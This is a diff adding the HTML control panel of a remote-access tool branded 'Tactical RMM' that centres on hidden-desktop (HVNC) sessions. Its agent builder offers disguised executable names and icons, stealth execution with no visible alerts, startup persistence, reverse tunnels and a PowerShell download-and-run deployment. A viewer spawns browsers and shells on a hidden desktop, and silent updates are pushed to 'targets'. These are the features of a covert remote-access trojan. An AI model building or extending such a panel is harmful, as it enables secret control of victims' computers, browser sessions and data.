@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tactical RMM — Advanced Endpoint Management & Hidden Desktop Hub</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Toast Notification Container -->
+    <div id="toastContainer" class="toast-container"></div>
+
+    <div class="master-layout">
+        <!-- Top Navigation Header -->
+        <header class="master-header">
+            <div class="header-left">
+                <div class="brand-logo">
+                    <div class="logo-shield">
+                        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            <path d="m9 12 2 2 4-4"/>
+                        </svg>
+                    </div>
+                    <div class="brand-text">
+                        <div class="brand-title-row">
+                            <h2>TACTICAL RMM</h2>
+                            <span class="version-tag">v2.0 PRO</span>
+                        </div>
+                        <span class="brand-tag">Hidden Virtual Desktop & Endpoint Operations</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Server Status & Metrics HUD -->
+            <div class="header-stats">
+                <div class="stat-card">
+                    <div class="stat-icon-wrap total">
+                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M7 7h10M7 12h10M7 17h10"/></svg>
+                    </div>
+                    <div class="stat-details">
+                        <span class="stat-label">Total Endpoints</span>
+                        <span class="stat-value" id="statTotal">0</span>
+                    </div>
+                </div>
+
+                <div class="stat-card online">
+                    <div class="stat-icon-wrap online">
+                        <span class="pulse-indicator"></span>
+                    </div>
+                    <div class="stat-details">
+                        <span class="stat-label">Online Now</span>
+                        <span class="stat-value text-emerald" id="statOnline">0</span>
+                    </div>
+                </div>
+
+                <div class="stat-card session">
+                    <div class="stat-icon-wrap session">
+                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                    </div>
+                    <div class="stat-details">
+                        <span class="stat-label">HVNC Sessions</span>
+                        <span class="stat-value text-cyan" id="statSessions">0</span>
+                    </div>
+                </div>
+
+                <div class="server-status-badge">
+                    <div class="status-indicator-dot online" id="wsIndicator"></div>
+                    <div class="server-text">
+                        <span class="server-state" id="wsStatusText">Master Live</span>
+                        <span class="server-ping" id="wsPing">Sync: Realtime</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="header-actions">
+                <button class="btn btn-outline" onclick="manualRefresh()" title="Refresh endpoint list from server">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"/></svg>
+                    <span>Refresh</span>
+                </button>
+                <button class="btn btn-primary glow-button" onclick="openGeneratorModal()">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
+                    <span>Generate Agent</span>
+                </button>
+                <button class="btn btn-outline btn-logout" onclick="logout()" title="Lock Portal & End Session" style="border-color: rgba(239, 68, 68, 0.35); color: #fca5a5;">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+                    <span>Lock Portal</span>
+                </button>
+            </div>
+        </header>
+
+        <!-- Main Dashboard Body -->
+        <main class="dashboard-body">
+            <!-- Filter & Search Controls -->
+            <div class="table-controls">
+                <div class="search-bar">
+                    <svg class="search-icon" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>
+                    </svg>
+                    <input type="text" id="searchInput" placeholder="Search by tag, hostname, username, IP, or Agent ID..." oninput="filterAgents()">
+                    <button id="clearSearchBtn" class="clear-search-btn" onclick="clearSearch()" style="display:none;">✕</button>
+                </div>
+
+                <div class="filter-pills">
+                    <button class="pill active" id="filterAll" onclick="setFilter('all', this)">
+                        All (<span id="countAll">0</span>)
+                    </button>
+                    <button class="pill pill-online" id="filterOnline" onclick="setFilter('online', this)">
+                        🟢 Online (<span id="countOnline">0</span>)
+                    </button>
+                    <button class="pill pill-offline" id="filterOffline" onclick="setFilter('offline', this)">
+                        ⚪ Offline (<span id="countOffline">0</span>)
+                    </button>
+                </div>
+            </div>
+
+            <!-- Agent Grid Table Container -->
+            <div class="table-card">
+                <div class="table-header-info">
+                    <div class="table-title">
+                        <h3>Managed Endpoints</h3>
+                        <span class="live-stream-badge">
+                            <span class="pulse-dot"></span> Live Tunnel Hub
+                        </span>
+                    </div>
+                    <div class="table-meta">
+                        <span id="agentCountSummary">Showing 0 endpoints</span>
+                    </div>
+                </div>
+
+                <div class="table-responsive">
+                    <table class="agent-table">
+                        <thead>
+                            <tr>
+                                <th style="width: 100px;">Status</th>
+                                <th style="width: 190px;">Endpoint / ID</th>
+                                <th>Hostname & User</th>
+                                <th>OS & Arch</th>
+                                <th>Network IP</th>
+                                <th>System Specs</th>
+                                <th style="width: 130px;">Agent Build</th>
+                                <th>Last Seen</th>
+                                <th style="text-align: right; width: 230px;">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="agentTableBody">
+                            <!-- Populated dynamically via JavaScript with zero reload -->
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- Sleek Empty State -->
+                <div id="emptyState" class="empty-state">
+                    <div class="empty-radar">
+                        <div class="radar-circle circle-1"></div>
+                        <div class="radar-circle circle-2"></div>
+                        <div class="radar-circle circle-3"></div>
+                        <div class="radar-icon">📡</div>
+                    </div>
+                    <h3>Listening for Target Endpoint Connections...</h3>
+                    <p>No agents have connected to this Master Hub yet. Target machines will automatically appear here the instant they run the installer.</p>
+                    <button class="btn btn-primary btn-empty-action" onclick="openGeneratorModal()">
+                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
+                        Create Standalone Agent Installer (.exe)
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- 1. Generate Agent Modal (Dismissable: Backdrop, X, Esc)   -->
+    <!-- ========================================================= -->
+    <div class="modal-backdrop" id="generatorModal" onclick="handleBackdropClick(event, 'generatorModal')">
+        <div class="modal-card wide animate-modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <div class="modal-title-group">
+                    <div class="modal-icon-badge">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
+                    </div>
+                    <div>
+                        <h3>Generate Target Endpoint Agent</h3>
+                        <p>Build an automated, zero-dependency installer that establishes a reverse tunnel to this Master Hub.</p>
+                    </div>
+                </div>
+                <button class="modal-close-btn" onclick="closeGeneratorModal()" title="Close (Esc)">&times;</button>
+            </div>
+
+            <div class="modal-body">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label>Endpoint Tag / Nickname</label>
+                        <input type="text" id="genTag" placeholder="e.g. Workstation-Finance-01" value="Workstation-01">
+                        <small class="hint">Custom identifier displayed in the Master Hub grid.</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Custom Executable File Name</label>
+                        <div class="input-with-badge">
+                            <input type="text" id="genCustomName" placeholder="e.g. ITSupport_Client">
+                            <span class="input-tag">.exe</span>
+                        </div>
+                        <small class="hint">Specify custom software name. Adding <code>.exe</code> is optional (added automatically).</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Target Architecture</label>
+                        <div class="radio-selector">
+                            <label class="radio-option">
+                                <input type="radio" name="genArch" value="x64" checked>
+                                <div class="option-card">
+                                    <div class="option-title">64-bit (x64 / AMD64)</div>
+                                    <div class="option-desc">Recommended for standard Windows 10/11/Server</div>
+                                </div>
+                            </label>
+                            <label class="radio-option">
+                                <input type="radio" name="genArch" value="x86">
+                                <div class="option-card">
+                                    <div class="option-title">32-bit (x86)</div>
+                                    <div class="option-desc">Legacy 32-bit Windows operating systems</div>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Custom Software Logo / Icon (.png / .ico / .jpg)</label>
+                        <script>
+                            // Inline fallback so icon preview works even if browser has cached older app.js
+                            window.currentAgentIconBase64 = window.currentAgentIconBase64 || null;
+                            window.previewAgentIcon = window.previewAgentIcon || function(event) {
+                                const file = event.target.files && event.target.files[0];
+                                if (!file) return;
+                                const reader = new FileReader();
+                                reader.onload = function(e) {
+                                    window.currentAgentIconBase64 = e.target.result;
+                                    const img = document.getElementById("iconPreviewImg");
+                                    const nameSpan = document.getElementById("iconFileName");
+                                    const container = document.getElementById("iconPreviewContainer");
+                                    if (img) img.src = window.currentAgentIconBase64;
+                                    if (nameSpan) nameSpan.innerText = file.name;
+                                    if (container) container.style.display = "inline-flex";
+                                };
+                                reader.readAsDataURL(file);
+                            };
+                            window.clearAgentIcon = window.clearAgentIcon || function() {
+                                window.currentAgentIconBase64 = null;
+                                const fileInput = document.getElementById("genIconFile");
+                                if (fileInput) fileInput.value = "";
+                                const container = document.getElementById("iconPreviewContainer");
+                                if (container) container.style.display = "none";
+                            };
+                        </script>
+                        <div class="file-upload-wrapper" style="display: flex; gap: 10px; align-items: center; margin-top: 4px;">
+                            <input type="file" id="genIconFile" accept=".ico,.png,.jpg,.jpeg" onchange="previewAgentIcon(event)" style="display: none;">
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="document.getElementById('genIconFile').click()" style="padding: 6px 12px; font-size: 12px;">
+                                <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 4px; vertical-align: middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                                Choose Logo File...
+                            </button>
+                            <div id="iconPreviewContainer" style="display: none; align-items: center; gap: 8px;">
+                                <img id="iconPreviewImg" src="" alt="Icon" style="width: 28px; height: 28px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.2); object-fit: contain; background: #111;">
+                                <span id="iconFileName" style="font-size: 11px; color: #a0aec0; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;"></span>
+                                <button type="button" onclick="clearAgentIcon()" title="Remove custom icon" style="background: none; border: none; color: #f56565; cursor: pointer; font-size: 16px; line-height: 1;">&times;</button>
+                            </div>
+                        </div>
+                        <small class="hint" style="margin-top: 5px; display: block; font-size: 11px; line-height: 1.4;">
+                            <strong>Recommended Dimensions:</strong> 256×256 px (Square 1:1, PNG or ICO). Standard multi-res Windows icon sizes (256x256, 128x128, 64x64, 48x48, 32x32, 16x16) are automatically generated.
+                        </small>
+                    </div>
+
+                    <div class="form-group full-width">
+                        <div class="label-with-action">
+                            <label>Master Hub WebSocket Reverse Tunnel URL</label>
+                            <button type="button" class="btn-text-action" onclick="detectLanIp()">
+                                <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9a16 16 0 0 1 21.16 0M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/></svg>
+                                Detect My Network IP
+                            </button>
+                        </div>
+                        <div class="input-with-badge">
+                            <input type="text" id="genServerUrl" placeholder="Auto-detecting server address...">
+                            <span class="input-tag">Tunnel Endpoint</span>
+                        </div>
+                        <small class="hint" id="serverUrlHint">Auto-detects this server's domain/IP. On localhost it uses local IP, on live servers (e.g. rmm.swiftvtu.com) it automatically uses the public domain.</small>
+                    </div>
+
+                    <div class="form-group full-width">
+                        <label>Persistence & Background Settings</label>
+                        <div class="checkbox-row">
+                            <label class="custom-checkbox">
+                                <input type="checkbox" id="genAutoStart" checked>
+                                <span class="checkbox-box"></span>
+                                <span class="checkbox-text">
+                                    <strong>Windows Startup Persistence</strong>
+                                    <small>Automatically re-connects on Windows boot / user login</small>
+                                </span>
+                            </label>
+                            <label class="custom-checkbox">
+                                <input type="checkbox" id="genHiddenMode" checked>
+                                <span class="checkbox-box"></span>
+                                <span class="checkbox-text">
+                                    <strong>Stealth Background Execution</strong>
+                                    <small>Zero command prompts or alerts displayed on target screen</small>
+                                </span>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Dynamic Build Result Panel -->
+                <div id="buildResultCard" class="build-result-card" style="display: none;">
+                    <div class="result-header">
+                        <div class="result-title">
+                            <div class="success-icon">✓</div>
+                            <div>
+                                <h4>Agent Package Generated Successfully</h4>
+                                <span id="builtFilename" class="built-name">TRMM_Agent_Setup.exe</span>
+                            </div>
+                        </div>
+                        <span class="status-tag-ready">READY FOR DEPLOYMENT</span>
+                    </div>
+
+                    <div class="deploy-cards-grid">
+                        <!-- Primary Standalone Executable Setup -->
+                        <div class="deploy-card highlight">
+                            <div class="deploy-card-tag">⭐ Recommended Method</div>
+                            <div class="deploy-card-header">
+                                <div class="file-badge exe">EXE</div>
+                                <div>
+                                    <h5>Standalone Setup Installer (.exe)</h5>
+                                    <p>Self-contained package with bundled runtime. 1-click execution on target machine.</p>
+                                </div>
+                            </div>
+                            <div class="deploy-card-actions">
+                                <a id="downloadExeLink" href="#" class="btn btn-success btn-full" download>
+                                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+                                    <span>Download Standalone Setup (.exe)</span>
+                                </a>
+                            </div>
+                        </div>
+
+                        <!-- One-Liner PowerShell Command -->
+                        <div class="deploy-card">
+                            <div class="deploy-card-header">
+                                <div class="file-badge ps">PS1</div>
+                                <div>
+                                    <h5>One-Line PowerShell Command</h5>
+                                    <p>Run in Admin PowerShell on target for automated download & run:</p>
+                                </div>
+                            </div>
+                            <div class="code-snippet-box">
+                                <input type="text" id="oneLinerCode" readonly>
+                                <button class="btn btn-copy" onclick="copyOneLiner()" title="Copy command">
+                                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                                    <span id="copyBtnText">Copy</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Single Batch Installer & Offline Zip -->
+                        <div class="deploy-card-sublinks">
+                            <a id="downloadScriptLink" href="#" class="sublink-btn" download>
+                                <span>📄 Download <code>install.bat</code> Script</span>
+                            </a>
+                            <span class="sublink-separator">•</span>
+                            <a id="downloadZipLink" href="#" class="sublink-btn" download>
+                                <span>📦 Download Full Offline <code>.zip</code> Archive</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeGeneratorModal()">Cancel</button>
+                <button class="btn btn-primary glow-button" id="btnBuildAgent" onclick="submitGenerateAgent()">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="m5 12 5 5L20 7"/></svg>
+                    <span>Build & Generate Package</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- 2. Fullscreen HVNC Session Viewer (Dismissable: Esc, X)  -->
+    <!-- ========================================================= -->
+    <div class="hvnc-modal-backdrop" id="hvncModal">
+        <div class="hvnc-modal-window">
+            <!-- Top Command Ribbon -->
+            <div class="hvnc-top-bar">
+                <div class="hvnc-title-info">
+                    <span class="live-pulse-badge">
+                        <span class="recording-dot"></span> HVNC ACTIVE
+                    </span>
+                    <div class="hvnc-meta-group">
+                        <h4 id="hvncTargetTitle">Target: Workstation-01</h4>
+                        <span class="hvnc-meta-text" id="hvncTargetMeta">Windows 11 (x64) • 192.168.1.150</span>
+                    </div>
+                </div>
+
+                <!-- Quick Background App Launcher Dock -->
+                <div class="hvnc-app-dock">
+                    <span class="dock-title">Spawn in Hidden Desktop:</span>
+                    <button class="dock-btn chrome" onclick="sendViewerLaunch('chrome')" title="Launch Isolated Google Chrome">
+                        <span class="dock-icon">🌐</span> Chrome
+                    </button>
+                    <button class="dock-btn edge" onclick="sendViewerLaunch('edge')" title="Launch Isolated Microsoft Edge">
+                        <span class="dock-icon">🌐</span> Edge
+                    </button>
+                    <button class="dock-btn" onclick="sendViewerLaunch('explorer')" title="Launch Isolated File Explorer">
+                        <span class="dock-icon">📁</span> Explorer
+                    </button>
+                    <button class="dock-btn" onclick="sendViewerLaunch('powershell')" title="Launch Isolated PowerShell">
+                        <span class="dock-icon">💻</span> PowerShell
+                    </button>
+                    <button class="dock-btn" onclick="sendViewerLaunch('cmd')" title="Launch Command Prompt">
+                        <span class="dock-icon">⌨️</span> CMD
+                    </button>
+                    <button class="dock-btn" onclick="sendViewerLaunch('taskmgr')" title="Launch Task Manager">
+                        <span class="dock-icon">📊</span> TaskMgr
+                    </button>
+                    <button class="dock-btn" onclick="sendViewerLaunch('regedit')" title="Launch Registry Editor">
+                        <span class="dock-icon">⚙️</span> Regedit
+                    </button>
+                </div>
+
+                <!-- Stream Telemetry & Session Actions -->
+                <div class="hvnc-window-controls">
+                    <div class="stream-stats">
+                        <span class="stat-chip" id="viewerFps">FPS: 0</span>
+                        <span class="stat-chip" id="viewerRes">1280x720</span>
+                    </div>
+
+                    <!-- Display Mode Controls -->
+                    <div class="display-mode-group" title="Canvas Display Scaling Mode">
+                        <button class="btn-mode active" id="modeFitBtn" onclick="setDisplayMode('fit')" title="Fit to Screen (Preserve Aspect Ratio)">Fit</button>
+                        <button class="btn-mode" id="modeFillBtn" onclick="setDisplayMode('fill')" title="Fill Entire Screen (Stretch to Fill)">Fill</button>
+                        <button class="btn-mode" id="modeNativeBtn" onclick="setDisplayMode('native')" title="1:1 Native Resolution">1:1</button>
+                    </div>
+
+                    <button class="btn-hvnc-action" id="btnToggleFullscreen" onclick="toggleCanvasFullscreen()" title="Toggle Fullscreen Mode (F11)">
+                        <svg id="fsIconExpand" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg>
+                        <svg id="fsIconCompress" style="display:none;" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h6m0 0v6m0-6L3 21m17-7h-6m0 0v6m0-6l7 7M4 10h6m0 0V4m0 6L3 3m17 7h-6m0 0V4m0 6l7-7"/></svg>
+                    </button>
+                    <button class="btn-close-hvnc" onclick="closeHvncSession()" title="Close Remote Session (Esc)">
+                        <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                        <span>Disconnect</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Virtual Canvas Display Area -->
+            <div class="hvnc-canvas-container" id="hvncCanvasContainer">
+                <div class="canvas-viewport" id="canvasViewport">
+                    <canvas id="hvncCanvas" width="1280" height="720" tabindex="0"></canvas>
+                    <div class="click-to-focus" id="clickToFocus">
+                        <div class="focus-bubble">
+                            <span class="focus-icon">🖱️</span>
+                            <span>Click inside canvas to take mouse & keyboard control</span>
+                            <span class="focus-key-hint">Press <strong>Esc</strong> to release or exit</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- 3. Update Available Modal (Intentional Admin Review)     -->
+    <!-- ========================================================= -->
+    <div class="modal-backdrop" id="updateModal" onclick="handleBackdropClick(event, 'updateModal')">
+        <div class="modal-card animate-modal" onclick="event.stopPropagation()" style="max-width: 480px;">
+            <div class="modal-header">
+                <div class="modal-title-group">
+                    <div class="modal-icon-badge" style="background: rgba(59, 130, 246, 0.12); color: #3b82f6; border-color: rgba(59, 130, 246, 0.25);">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"/></svg>
+                    </div>
+                    <div>
+                        <h3>OTA Update Available</h3>
+                        <p id="updateTargetMeta">Target endpoint is ready for OTA update</p>
+                    </div>
+                </div>
+                <button class="modal-close-btn" onclick="closeUpdateModal()" title="Close (Esc)">&times;</button>
+            </div>
+
+            <div class="modal-body">
+                <div style="background: #0f172a; border: 1px solid #1e293b; border-radius: 6px; padding: 14px; margin-bottom: 14px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                        <span style="font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase;">Available Version</span>
+                        <span id="updateVersionBadge" class="version-tag" style="background: rgba(37, 99, 235, 0.2); color: #60a5fa; border: 1px solid rgba(37, 99, 235, 0.4);">2.8.0-live</span>
+                    </div>
+                    <p id="updateDescriptionText" style="font-size: 13px; color: #cbd5e1; line-height: 1.5; margin: 0;">
+                        Description of update changes.
+                    </p>
+                </div>
+                <p style="font-size: 12px; color: #64748b; margin: 0;">
+                    Applying this update will stream the new code bundle directly to the agent in the background with zero visible windows or interruptions to the user.
+                </p>
+            </div>
+
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeUpdateModal()">Cancel</button>
+                <button class="btn btn-primary" id="btnConfirmPushUpdate" onclick="confirmPushUpdate()">
+                    <span>Push Update Now</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/app.js?v=2.9.0"></script>
+</body>
+</html>
